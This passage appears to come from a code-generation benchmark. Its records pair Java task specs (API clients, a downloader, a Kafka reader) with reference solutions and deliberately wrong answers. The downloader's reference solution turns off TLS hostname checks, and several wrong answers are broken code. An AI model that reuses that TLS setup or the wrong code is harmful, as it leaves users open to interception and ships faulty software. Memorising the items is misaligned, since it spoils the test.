    "Instruction": "Task Description: Create a Java class that interacts with the Danbooru API to fetch and process image posts, including retrieving pages of posts, extracting image URLs, and parsing tags from URLs.\n\nClass Description: The DanbooruApiClient class provides functionality to interact with the Danbooru image board API. It handles HTTP requests to fetch posts, processes JSON responses, and extracts relevant information from URLs.\n\nAttributes:\n- DOMAIN: [String] - The domain name of the Danbooru service\n- client: [OkHttpClient] - HTTP client instance for making requests\n- gidPattern: [Pattern] - Regular expression pattern for parsing tags from URLs\n- currentPageNum: [int] - Tracks the current page number for pagination\n\nMethods:\n- Constructor: DanbooruApiClient() -> [void] - Initializes the HTTP client with timeout settings\n- getPage: [int pageNum] -> [JSONObject] - Fetches a page of posts from Danbooru API with the specified page number, returns posts as JSON object\n- extractUrlsFromJson: [JSONObject json] -> [List<String>] - Extracts image URLs from the JSON response and returns them as a list\n- getTagFromUrl: [URL url] -> [String] - Parses and returns the tag component from a Danbooru URL, throws MalformedURLException if URL format is invalid",
    "Canonical_solution": "import com.rarchives.ripme.utils.Utils;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport org.json.JSONArray;\nimport org.json.JSONObject;\n\nimport java.io.IOException;\nimport java.net.MalformedURLException;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.TimeUnit;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\npublic class DanbooruApiClient {\n    private static final String DOMAIN = \"danbooru.donmai.us\";\n    private final OkHttpClient client;\n    private Pattern gidPattern = null;\n    private int currentPageNum = 1;\n\n    public DanbooruApiClient() {\n        this.client = new OkHttpClient.Builder()\n                .readTimeout(60, TimeUnit.SECONDS)\n                .writeTimeout(60, TimeUnit.SECONDS)\n                .build();\n    }\n\n    public JSONObject getPage(int pageNum) throws MalformedURLException {\n        Request request = new Request.Builder()\n                .url(\"https://\" + DOMAIN + \"/posts.json?page=\" + pageNum)\n                .header(\"User-Agent\", \"Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1\")\n                .header(\"Accept\", \"application/json,text/javascript,*/*;q=0.01\")\n                .header(\"Accept-Language\", \"en-US,en;q=0.9\")\n                .header(\"Sec-Fetch-Dest\", \"empty\")\n                .header(\"Sec-Fetch-Mode\", \"cors\")\n                .header(\"Sec-Fetch-Site\", \"same-origin\")\n                .header(\"Referer\", \"https://danbooru.donmai.us/\")\n                .header(\"X-Requested-With\", \"XMLHttpRequest\")\n                .header(\"Connection\", \"keep-alive\")\n                .build();\n\n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n\n            String responseData = response.body().string();\n            JSONArray jsonArray = new JSONArray(responseData);\n            if (!jsonArray.isEmpty()) {\n                return new JSONObject(\"{ \\\"resources\\\":\" + jsonArray + \" }\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    public List<String> extractUrlsFromJson(JSONObject json) {\n        List<String> res = new ArrayList<>(100);\n        JSONArray jsonArray = json.getJSONArray(\"resources\");\n        for (int i = 0; i < jsonArray.length(); i++) {\n            if (jsonArray.getJSONObject(i).has(\"file_url\")) {\n                res.add(jsonArray.getJSONObject(i).getString(\"file_url\"));\n            }\n        }\n        return res;\n    }\n\n    public String getTagFromUrl(URL url) throws MalformedURLException {\n        gidPattern = Pattern.compile(\"https?://danbooru.donmai.us/(posts)?.*([?&]tags=([^&]*)(?:&z=([0-9]+))?$)\");\n        Matcher m = gidPattern.matcher(url.toExternalForm());\n\n        if (m.matches()) {\n            return m.group(3);\n        }\n\n        throw new MalformedURLException(\"Expected danbooru URL format: \" + DOMAIN + \"/posts?tags=searchterm - got \" + url + \" instead\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "public class DanbooruApiClient {\n    private String DOMAIN = \"danbooru.com\";\n    private OkHttpClient client;\n    private Pattern gidPattern;\n    private int currentPageNum;\n\n    public DanbooruApiClient() {\n        client = new OkHttpClient();\n        client.setConnectTimeout(10, TimeUnit.SECONDS);\n        client.setReadTimeout(10, TimeUnit.SECONDS);\n        gidPattern = Pattern.compile(\"/posts/(\\\\d+)\");\n    }\n\n    public JSONObject getPage(int pageNum) throws IOException {\n        String url = \"https://\" + DOMAIN + \"/posts.json?page=\" + pageNum;\n        Request request = new Request.Builder().url(url).build();\n        Response response = client.newCall(request).execute();\n        if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n        return new JSONObject(response.body().string());\n    }\n\n    public List<String> extractUrlsFromJson(JSONObject json) {\n        List<String> urls = new ArrayList<>();\n        JSONArray posts = json.getJSONArray(\"posts\");\n        for (int i = 0; i < posts.length(); i++) {\n            JSONObject post = posts.getJSONObject(i);\n            String imageUrl = post.getString(\"image\");\n            urls.add(imageUrl);\n        }\n        return urls;\n    }\n\n    public String getTagFromUrl(URL url) throws MalformedURLException {\n        Matcher matcher = gidPattern.matcher(url.toString());\n        if (matcher.find()) {\n            return matcher.group(1);\n        } else {\n            throw new MalformedURLException(\"URL does not match expected format\");\n        }\n    }\n}"
  },
  {
    "Task_id": 244,
    "Instruction": "Task Description: Create a Java class that implements a RESTful API client for expanding medical terminology value sets using the OkHttp library.\n\nClass Description: The TerminologyServiceClient class provides functionality to interact with a FHIR terminology service to expand value sets. It handles HTTP requests and responses, URL validation, and error handling.\n\nAttributes:\n- client: OkHttpClient - A shared HTTP client instance for making requests\n- urlValidator: UrlValidator - A validator for checking URL formats with support for double slashes\n- expandBaseUrl: String - The base URL for the value set expansion endpoint\n\nMethods:\n- setBaseUrl(String url) -> void - Sets the base URL for the terminology service by appending the value set expansion endpoint path\n- expandValueSet(String valueSetUri) -> Response - Makes a GET request to expand a value set, validates the input URI, and returns the HTTP response",
    "Canonical_solution": "import okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport okhttp3.ResponseBody;\nimport org.apache.commons.validator.routines.UrlValidator;\n\npublic class TerminologyServiceClient {\n    private static OkHttpClient client = new OkHttpClient();\n    private static UrlValidator urlValidator = new UrlValidator(UrlValidator.ALLOW_2_SLASHES);\n    private static String expandBaseUrl;\n\n    public static void setBaseUrl(String url) {\n        expandBaseUrl = url + \"/ValueSet/$expand?url=\";\n    }\n\n    public static Response expandValueSet(String valueSetUri) {\n        if (!urlValidator.isValid(valueSetUri)) {\n            throw new IllegalArgumentException(\"Invalid ValueSet URI\");\n        }\n\n        Request request = new Request.Builder()\n                .url(expandBaseUrl + valueSetUri)\n                .header(\"Accept\", \"application/json\")\n                .build();\n\n        try {\n            Response response = client.newCall(request).execute();\n            ResponseBody body = response.body();\n            if (body == null) {\n                throw new RuntimeException(\"Value Set Expansion contained no body\");\n            }\n            return response;\n        } catch (IOException e) {\n            throw new RuntimeException(\"Issue when expanding the value set\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "import okhttp3.OkHttpClient; import okhttp3.Request; import okhttp3.Response; import okhttp3.ResponseBody; import java.io.IOException; public class TerminologyServiceClient { private final OkHttpClient client; private final UrlValidator urlValidator; private String expandBaseUrl; public TerminologyServiceClient() { this.client = new OkHttpClient(); this.urlValidator = new UrlValidator(); } public void setBaseUrl(String url) { expandBaseUrl = url + \"/ValueSet/$expand\"; } public Response expandValueSet(String valueSetUri) { if (!urlValidator.isValid(valueSetUri)) { try { return new Response.Builder().code(400).message(\"Invalid value set URI\").body(ResponseBody.create(\"\", \"text/plain\")).build(); } catch (IOException e) { return null; } } String fullUrl = expandBaseUrl + \"?url=\" + valueSetUri; try { Request request = new Request.Builder().url(fullUrl).get().build(); return client.newCall(request).execute().response(); } catch (IOException e) { return null; } } }"
  },
  {
    "Task_id": 249,
    "Instruction": "Task Description: Create a Java class for HTTP downloading with support for multi-threaded downloads, range requests, and connection pooling.\n\nClass Description: HttpDownloader is a Java class that extends InputStream to provide HTTP downloading capabilities. It supports multi-threaded downloads, range requests, connection pooling, and retry mechanisms. The class manages download tasks through a thread pool and handles response streaming efficiently.\n\nAttributes:\n\ncontentType: String - MIME type of the downloaded content\ncontentLength: long - Total size of the content being downloaded\ncontentEnd: long - Ending byte position for downloads\nheader: Headers - HTTP response headers\nstatusCode: int - HTTP status code\ndirectUrl: String - Final URL after redirects\ncurConnId: volatile static int - Connection counter\nclosed: volatile boolean - Flag indicating if downloader is closed\nconnId: int - Current connection ID\nis: InputStream - Current input stream\ncallableQueue: Queue<Callable<InputStream>> - Queue of download tasks\nfutureQueue: Queue<Future<InputStream>> - Queue of future results\ndownloaderMap: static HashMap<String, HttpDownloader> - Cache of active downloaders\nexecutorService: ExecutorService - Thread pool for download tasks\nsupportRange: boolean - Flag for server range support\nblockSize: int - Size of each download block (default 10MB)\nthreadNum: int - Number of download threads (default 2)\ncookie: String - Cookie header value\nreferer: String - Referer header value\nblockCounter: int - Counter for downloaded blocks\ndownloadClient: OkHttpClient - Custom HTTP client for downloads\ndefaultClient: OkHttpClient - Default HTTP client configuration\n\nMethods:\n\nHttpDownloader(Map<String, String> params) - Constructor - Initializes downloader with configuration parameters\ncreateDownloadTask(String url, Map<String, String> headers) - void - Creates download tasks based on range and thread configuration\ndownloadTask(String url, Map<String, String> headers, String range, int sliceNum) -> InputStream - Performs actual HTTP download\n_downloadTask(String url, Map<String, String> headers, String range, int sliceNum) -> InputStream - Internal download implementation\nread(byte[] buffer, int off, int len) -> int - Reads data from download stream\nread() -> int - Throws IOException (not implemented)\nclose() - void - Cleans up resources and stops downloads\nrunTask(int num) - void - Starts specified number of download tasks",
    "Canonical_solution": "import java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.Map;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.TreeMap;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.Future;\nimport java.util.Queue;\nimport java.util.LinkedList;\nimport java.util.regex.Pattern;\nimport java.util.regex.Matcher;\nimport java.net.URL;\nimport java.util.HashMap;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.Callable;\n\nimport okhttp3.OkHttpClient;\nimport okhttp3.Dispatcher;\nimport okhttp3.FormBody;\nimport okhttp3.RequestBody;\nimport okhttp3.Request;\nimport okhttp3.Headers;\nimport okhttp3.Response;\nimport okhttp3.Call;\nimport org.json.JSONObject;\n\npublic class HttpDownloader extends InputStream {\n    public String contentType = \"\";\n    public long contentLength = -1;\n    long contentEnd;\n    public Headers header;\n    public int statusCode = 200;\n    String directUrl = null;\n    volatile static int curConnId = 0;\n    volatile boolean closed = false;\n    int connId;\n    InputStream is = null;\n    Queue<Callable<InputStream>> callableQueue = new LinkedList<>();\n    Queue<Future<InputStream>> futureQueue = new LinkedList<>();\n    static HashMap<String, HttpDownloader> downloaderMap = new HashMap<>();\n    ExecutorService executorService = Executors.newFixedThreadPool(128);\n    boolean supportRange = true;\n    int blockSize = 10 * 1024 * 1024;\n    int threadNum = 2;\n    String cookie = null;\n    String referer = null;\n    int blockCounter = 0;\n    OkHttpClient downloadClient = null;\n    OkHttpClient defaultClient = new OkHttpClient.Builder()\n        .connectTimeout(30, TimeUnit.SECONDS)\n        .readTimeout(30, TimeUnit.SECONDS)\n        .writeTimeout(30, TimeUnit.SECONDS)\n        .hostnameVerifier((hostname, session) -> true)\n        .sslSocketFactory(new MySSLCompat(), MySSLCompat.TM)\n        .build();\n\n    public HttpDownloader(Map<String, String> params) {\n        Dispatcher dispatcher = new Dispatcher();\n        dispatcher.setMaxRequests(3000000);\n        dispatcher.setMaxRequestsPerHost(1000000);\n        downloadClient = defaultClient.newBuilder()\n            .dispatcher(dispatcher)\n            .connectTimeout(3, TimeUnit.SECONDS)\n            .readTimeout(3, TimeUnit.SECONDS)\n            .writeTimeout(3, TimeUnit.SECONDS)\n            .build();\n        \n        connId = curConnId++;\n        String url = params.get(\"url\");\n        downloaderMap.entrySet().removeIf(entry -> entry.getValue().closed);\n        HttpDownloader cacheDownloader = downloaderMap.get(url);\n        if (cacheDownloader != null) {\n            cacheDownloader.close();\n        }\n        downloaderMap.put(url, this);\n\n        if(params.get(\"thread\") != null){\n            threadNum = Integer.parseInt(params.get(\"thread\"));\n        }\n        if(params.get(\"size\") != null){\n            blockSize = Integer.parseInt(params.get(\"size\"));\n        }\n        if(params.get(\"cookie\") != null){\n            cookie = params.get(\"cookie\");\n        }\n\n        Map<String, String> headers = new TreeMap<>(String.CASE_INSENSITIVE_ORDER);\n        List<String> keys = Arrays.asList(\"referer\", \"icy-metadata\", \"range\", \"connection\", \"accept-encoding\", \"user-agent\", \"cookie\", \"authorization\");\n        for (String key : params.keySet()) if (keys.contains(key)) headers.put(key, params.get(key));\n        if(url.contains(\"\u5938\u514b\")) {\n            headers.put(\"user-agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) quark-cloud-drive/2.5.20 Chrome/100.0.4896.160 Electron/18.3.5.4-b478491100 Safari/537.36 Channel/pckk_other_ch\");\n        }\n        String range = \"\";\n        if (params.get(\"range\") != null) {\n            range = params.get(\"range\");\n        }\n        this.getHeader(url, headers);\n        this.createDownloadTask(directUrl, headers);\n    }\n\n    private void createDownloadTask(String url, Map<String, String> headers) {\n        Request.Builder requestBuilder = new Request.Builder().url(url);\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            requestBuilder.addHeader(entry.getKey(), entry.getValue());\n        }\n        Request request = requestBuilder.build();\n        \n        if(!this.supportRange || threadNum == 0) {\n            Callable<InputStream> callable = () -> {\n                return downloadTask(url, headers, \"\", 0);\n            };\n            callableQueue.add(callable);\n            return;\n        }\n        \n        long start = 0; \n        long end = this.contentEnd;\n        String range = request.headers().get(\"Range\");\n        range = range == null ? \"0-\" : range;\n        range = range + \"-\" + this.contentEnd;\n        range = range.replace(\"--\", \"-\");\n        String pattern = \"bytes=(\\\\d+)-(\\\\d+)\";\n        Pattern r = Pattern.compile(pattern);\n        Matcher m = r.matcher(range);\n        if (m.find()) {\n            String startString = m.group(1); \n            String endString = m.group(2);\n            start = Long.parseLong(startString); \n            end = Long.parseLong(endString);\n        }\n\n        int sliceNum = 0;\n        while (start <= end) {\n            long curEnd = start + blockSize - 1;\n            curEnd = curEnd > end ? end : curEnd;\n            String ra = \"bytes=\" + start + \"-\" + curEnd;\n            final int _sliceNum = sliceNum;\n            Callable<InputStream> callable = () -> {\n                return downloadTask(url, headers, ra, _sliceNum);\n            };\n            callableQueue.add(callable);\n            start = curEnd + 1;\n            sliceNum++;\n        }\n    }\n\n    private InputStream downloadTask(String url, Map<String, String> headers, String range, int sliceNum) {\n        return _downloadTask(url,headers,range,sliceNum);\n    }\n\n    private InputStream _downloadTask(String url, Map<String, String> headers, String range, int sliceNum) {\n        if(closed){\n            return null;\n        }\n        Request.Builder requestBuilder = new Request.Builder().url(url);\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            requestBuilder.addHeader(entry.getKey(), entry.getValue());\n        }\n        if (!range.isEmpty()) {\n            requestBuilder.removeHeader(\"Range\").addHeader(\"Range\", range);\n        }\n        if (cookie != null) {\n            requestBuilder.removeHeader(\"Cookie\").addHeader(\"Cookie\", cookie);\n        }\n        if (referer != null) {\n            requestBuilder.removeHeader(\"Referer\").addHeader(\"Referer\", referer);\n        }\n        Request request = requestBuilder.build();\n        int retryCount = 0;\n        int maxRetry = 5;\n        byte[] downloadbBuffer = new byte[1024*1024];\n        Response response = null;\n        Call call = null;\n        boolean directResp = false;\n        while (retryCount < maxRetry && !closed) {\n            try {\n                directResp = false;\n                call = downloadClient.newCall(request);\n                response = call.execute();\n                if (!response.isSuccessful()) {\n                    continue;\n                }\n                if (range.isEmpty()) {\n                    directResp = true;\n                    return response.body().byteStream();\n                }\n                if(sliceNum==0){\n                    directResp = true;\n                    return response.body().byteStream();\n                }\n                \n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                int bytesRead;\n                while (!closed && (bytesRead = response.body().byteStream().read(downloadbBuffer)) != -1) {\n                    baos.write(downloadbBuffer, 0, bytesRead);\n                }\n                return new ByteArrayInputStream(baos.toByteArray());\n            } catch (Exception e) {} finally {\n                if(response != null && !directResp){\n                    call.cancel();\n                    response.close();\n                }\n                retryCount++;\n            }\n        }\n        return null;\n    }\n\n    @Override\n    public synchronized int read(byte[] buffer, int off, int len) throws IOException {\n        try {\n            if (closed) {\n                return -1;\n            }\n            \n            if (this.is == null ) {\n                runTask(threadNum < 1 ? 1 : threadNum);\n                this.is = this.futureQueue.remove().get();\n                runTask(1);\n                blockCounter++;\n            }\n            int ol = this.is.read(buffer, off, len);\n            if ( ol == -1 ) {\n                this.is = this.futureQueue.remove().get();\n                runTask(1);\n                blockCounter++;\n                return this.is.read(buffer, off, len);\n            } \n            return ol;\n        } catch (Exception e) {\n            return -1;\n        }\n    }\n    \n    @Override\n    public int read() throws IOException {\n        throw new IOException(\"\u65b9\u6cd5\u672a\u5b9e\u73b0\uff0c\u4e0d\u80fd\u8c03\u7528\uff01\");\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (closed) {\n            return;\n        }\n        closed = true;\n        if(this.executorService != null) {\n            this.executorService.shutdownNow();\n        }\n        futureQueue.clear();\n        callableQueue.clear();\n    }\n\n    private void runTask(int num) {\n        while(num-- > 0 && callableQueue.size() > 0) {\n            Future<InputStream> future = this.executorService.submit(callableQueue.remove());\n            this.futureQueue.add(future);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "```java\nimport java.io.InputStream;\nimport java.io.IOException;\nimport java.util.Map;\nimport java.util.Queue;\nimport java.util.concurrent.Callable;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport okhttp3.Headers;\n\npublic class HttpDownloader extends InputStream {\n    private final String contentType;\n    private final long contentLength;\n    private final long contentEnd;\n    private final Headers header;\n    private final int statusCode;\n    private final String directUrl;\n    private volatile static int curConnId = 0;\n    private volatile boolean closed;\n    private int connId;\n    private InputStream is;\n    private Queue<Callable<InputStream>> callableQueue = new LinkedBlockingQueue<>();\n    private Queue<Future<InputStream>> futureQueue = new LinkedBlockingQueue<>();\n    private static ConcurrentHashMap<String, HttpDownloader> downloaderMap = new ConcurrentHashMap<>();\n    private ExecutorService executorService;\n    private boolean supportRange;\n    private int blockSize = 10 * 1024 * 1024;\n    private int threadNum = 2;\n    private String cookie;\n    private String referer;\n    private int blockCounter;\n    private OkHttpClient downloadClient;\n    private OkHttpClient defaultClient;\n\n    public HttpDownloader(Map<String, String> params) {\n        this.contentType = params.get(\"contentType\");\n        this.contentLength = Long.parseLong(params.get(\"contentLength\"));\n        this.contentEnd = Long.parseLong(params.get(\"contentEnd\"));\n        this.header = Headers.of(params.get(\"headers\"));\n        this.statusCode = Integer.parseInt(params.get(\"statusCode\"));\n        this.directUrl = params.get(\"directUrl\");\n        this.cookie = params.get(\"cookie\");\n        this.referer = params.get(\"referer\");\n        this.blockSize = Integer.parseInt(params.get(\"blockSize\", \"1048576\"));\n        this.threadNum = Integer.parseInt(params.get(\"threadNum\", \"2\"));\n        this.downloadClient = new OkHttpClient.Builder()\n                .connectionPool(new OkHttpClient.ConnectionPool(5, 1, TimeUnit.MINUTES))\n                .build();\n        this.defaultClient = new OkHttpClient.Builder().build();\n        this.executorService = Executors.newFixedThreadPool(threadNum);\n        this.supportRange = true;\n        this.connId = curConnId++;\n        this.closed = false;\n    }\n\n    public void createDownloadTask(String url, Map<String, String> headers) {\n        // Logic to create and submit download tasks\n    }\n\n    public InputStream downloadTask(String url, Map<String, String> headers, String range, int sliceNum) throws IOException {\n        // Logic to perform actual HTTP download\n        return null;\n    }\n\n    private InputStream _downloadTask(String url, Map<String, String> headers, String range, int sliceNum) throws IOException {\n        // Internal download implementation\n        return null;\n    }\n\n    @Override\n    public int read(byte[] buffer, int off, int len) throws IOException {\n        throw new IOException(\"Not implemented\");\n    }\n\n    @Override\n    public int read() throws IOException {\n        throw new IOException(\"Not implemented\");\n    }\n\n    public void close() {\n        // Cleanup resources and stop downloads\n    }\n\n    public void runTask(int num) {\n        // Start specified number of download tasks\n    }\n}\n```"
  },
  {
    "Task_id": 25,
    "Instruction": "Task Description: Create a Java class that processes large files efficiently using memory-mapped file I/O operations through FileChannel and MappedByteBuffer.\n\nClass Description: FileChannelProcessor is a utility class designed to handle large file processing by mapping portions of a file into memory buffers. It reads files in chunks (up to 500MB each) and ensures each chunk ends at a line boundary for proper text processing.\n\nAttributes:\n- BUFFER_SIZE: int - Constant defining the maximum size (500MB) for each memory-mapped buffer\n- channel: FileChannel - The file channel used for file operations\n- buffers: List<Buffer> - List of buffers containing mapped portions of the file\n\nMethods:\n- FileChannelProcessor(Path filePath) -> void - Constructor that initializes the FileChannel by opening the specified file\n- createBuffers() -> List<Buffer> - Creates memory-mapped buffers for the file, ensuring each buffer ends at a line boundary\n- close() -> void - Closes the FileChannel to release system resources\n\nNested Record:\n- Buffer(ByteBuffer byteBuffer, int length) - A record holding a ByteBuffer and its effective length (up to the last newline character)",
    "Canonical_solution": "import java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.util.ArrayList;\nimport java.util.List;\n\nimport static java.nio.channels.FileChannel.MapMode.READ_ONLY;\n\npublic class FileChannelProcessor {\n    private static final int BUFFER_SIZE = (1 << 29); // 500mb\n    private final FileChannel channel;\n    private final List<Buffer> buffers = new ArrayList<>();\n\n    public FileChannelProcessor(Path filePath) throws Exception {\n        this.channel = FileChannel.open(filePath);\n    }\n\n    public List<Buffer> createBuffers() throws Exception {\n        long size = channel.size();\n        int lastByte;\n        for (long offset = 0; offset < size; offset += lastByte + 1) {\n            long sizeToMap = Math.min(size - offset, BUFFER_SIZE);\n            MappedByteBuffer buffer = channel.map(READ_ONLY, offset, sizeToMap);\n            lastByte = (int) sizeToMap - 1;\n            while (buffer.get(lastByte) != '\\n')\n                --lastByte;\n            buffers.add(new Buffer(buffer, lastByte + 1));\n        }\n        return buffers;\n    }\n\n    public void close() throws Exception {\n        channel.close();\n    }\n\n    public record Buffer(ByteBuffer byteBuffer, int length) {\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class FileChannelProcessor {\n    private static final int BUFFER_SIZE = 500 * 1024 * 1024;\n    private final FileChannel channel;\n    private final List<Buffer> buffers;\n\n    public FileChannelProcessor(Path filePath) throws IOException {\n        this.channel = FileChannel.open(filePath, StandardOpenOption.READ);\n        this.buffers = createBuffers();\n    }\n\n    private List<Buffer> createBuffers() throws IOException {\n        long fileSize = channel.size();\n        if (fileSize == 0) {\n            return Collections.emptyList();\n        }\n        MappedByteBuffer mappedBuffer = channel.map(FileChannel.MapMode.READ_ONLY, 0, fileSize);\n        List<Buffer> buffers = new ArrayList<>();\n        long currentPosition = 0;\n        while (currentPosition < fileSize) {\n            long endPos = currentPosition + BUFFER_SIZE;\n            if (endPos > fileSize) {\n                endPos = fileSize;\n            }\n            int lineEnd = findNextLineEnding(mappedBuffer, (int) currentPosition);\n            if (lineEnd == -1) {\n                lineEnd = (int) endPos;\n            } else {\n                lineEnd = Math.min(lineEnd, (int) endPos);\n            }\n            if (lineEnd > fileSize) {\n                lineEnd = (int) fileSize;\n            }\n            int sliceStart = (int) currentPosition;\n            int sliceLength = lineEnd - sliceStart;\n            ByteBuffer slice = mappedBuffer.slice(sliceStart, sliceLength);\n            buffers.add(new Buffer(slice, sliceLength));\n            currentPosition = lineEnd;\n        }\n        return buffers;\n    }\n\n    private int findNextLineEnding(MappedByteBuffer buffer, int startPos) {\n        int pos = startPos;\n        while (pos < buffer.capacity()) {\n            if (buffer.get(pos) == '\\n') {\n                return pos;\n            } else if (pos + 1 < buffer.capacity() && buffer.get(pos) == '\\r' && buffer.get(pos + 1) == '\\n') {\n                return pos + 1;\n            }\n            pos++;\n        }\n        return -1;\n    }\n\n    public void close() throws IOException {\n        if (channel != null) {\n            channel.close();\n        }\n    }\n\n    public record Buffer(ByteBuffer byteBuffer, int length) {}\n}"
  },
  {
    "Task_id": 251,
    "Instruction": "Task Description: Create a Kafka consumer class that reads messages from specified Kafka topic partitions and integrates with Spring Batch for state management and offset tracking.\n\nClass Description: KafkaItemReader is a Spring Batch ItemReader implementation that consumes messages from Kafka topics. It maintains partition offsets, supports state persistence between batches, and provides configurable polling behavior.\n\nAttributes:\n- TOPIC_PARTITION_OFFSETS: [String] - Key for storing partition offsets in execution context\n- DEFAULT_POLL_TIMEOUT: [long] - Default timeout duration for consumer polling (30 seconds)\n- topicPartitions: [List<TopicPartition>] - List of topic partitions to consume from\n- partitionOffsets: [Map<TopicPartition, Long>] - Current offsets for each partition\n- kafkaConsumer: [KafkaConsumer<K, V>] - Kafka consumer instance\n- consumerProperties: [Properties] - Configuration properties for Kafka consumer\n- consumerRecords: [Iterator<ConsumerRecord<K, V>>] - Iterator for currently polled records\n- pollTimeout: [Duration] - Timeout duration for polling messages\n- saveState: [boolean] - Flag indicating whether to save consumer state\n\nMethods:\n- KafkaItemReader(Properties, String, Integer...) -> [Constructor] - Creates reader with properties, topic name, and partition array\n- KafkaItemReader(Properties, String, List<Integer>) -> [Constructor] - Creates reader with properties, topic name, and partition list\n- open(ExecutionContext) -> [void] - Initializes Kafka consumer, restores offsets if available, and seeks to appropriate positions\n- read() -> [V] - Reads next message from Kafka, returns message value or null if no messages available\n- update(ExecutionContext) -> [void] - Saves current partition offsets to execution context and commits offsets to Kafka\n- close() -> [void] - Closes the Kafka consumer when reader is no longer needed",
    "Canonical_solution": "import org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.consumer.KafkaConsumer;\nimport org.apache.kafka.common.TopicPartition;\nimport org.springframework.batch.item.ExecutionContext;\nimport org.springframework.batch.item.support.AbstractItemStreamItemReader;\nimport org.springframework.lang.Nullable;\nimport org.springframework.util.Assert;\n\nimport java.time.Duration;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Properties;\n\npublic class KafkaItemReader<K, V> extends AbstractItemStreamItemReader<V> {\n\n    private static final String TOPIC_PARTITION_OFFSETS = \"topic.partition.offsets\";\n    private static final long DEFAULT_POLL_TIMEOUT = 30L;\n\n    private final List<TopicPartition> topicPartitions;\n    private Map<TopicPartition, Long> partitionOffsets;\n    private KafkaConsumer<K, V> kafkaConsumer;\n    private final Properties consumerProperties;\n    private Iterator<ConsumerRecord<K, V>> consumerRecords;\n    private Duration pollTimeout = Duration.ofSeconds(DEFAULT_POLL_TIMEOUT);\n    private boolean saveState = true;\n\n    public KafkaItemReader(Properties consumerProperties, String topicName, Integer... partitions) {\n        this(consumerProperties, topicName, Arrays.asList(partitions));\n    }\n\n    public KafkaItemReader(Properties consumerProperties, String topicName, List<Integer> partitions) {\n        Assert.notNull(consumerProperties, \"Consumer properties must not be null\");\n        Assert.isTrue(consumerProperties.containsKey(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG),\n                ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG + \" property must be provided\");\n        Assert.isTrue(consumerProperties.containsKey(ConsumerConfig.GROUP_ID_CONFIG),\n                ConsumerConfig.GROUP_ID_CONFIG + \" property must be provided\");\n        Assert.isTrue(consumerProperties.containsKey(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG),\n                ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG + \" property must be provided\");\n        Assert.isTrue(consumerProperties.containsKey(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG),\n                ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG + \" property must be provided\");\n        this.consumerProperties = consumerProperties;\n        Assert.hasLength(topicName, \"Topic name must not be null or empty\");\n        Assert.isTrue(!partitions.isEmpty(), \"At least one partition must be provided\");\n        this.topicPartitions = new ArrayList<>();\n        for (Integer partition : partitions) {\n            this.topicPartitions.add(new TopicPartition(topicName, partition));\n        }\n    }\n\n    @Override\n    public void open(ExecutionContext executionContext) {\n        this.kafkaConsumer = new KafkaConsumer<>(this.consumerProperties);\n        if (this.partitionOffsets == null) {\n            this.partitionOffsets = new HashMap<>();\n            for (TopicPartition topicPartition : this.topicPartitions) {\n                this.partitionOffsets.put(topicPartition, 0L);\n            }\n        }\n        if (this.saveState && executionContext.containsKey(TOPIC_PARTITION_OFFSETS)) {\n            Map<TopicPartition, Long> offsets = (Map<TopicPartition, Long>) executionContext\n                    .get(TOPIC_PARTITION_OFFSETS);\n            for (Map.Entry<TopicPartition, Long> entry : offsets.entrySet()) {\n                this.partitionOffsets.put(entry.getKey(), entry.getValue() == 0 ? 0 : entry.getValue() + 1);\n            }\n        }\n        this.kafkaConsumer.assign(this.topicPartitions);\n        this.partitionOffsets.forEach(this.kafkaConsumer::seek);\n    }\n\n    @Nullable\n    @Override\n    public V read() {\n        if (this.consumerRecords == null || !this.consumerRecords.hasNext()) {\n            this.consumerRecords = this.kafkaConsumer.poll(this.pollTimeout).iterator();\n        }\n        if 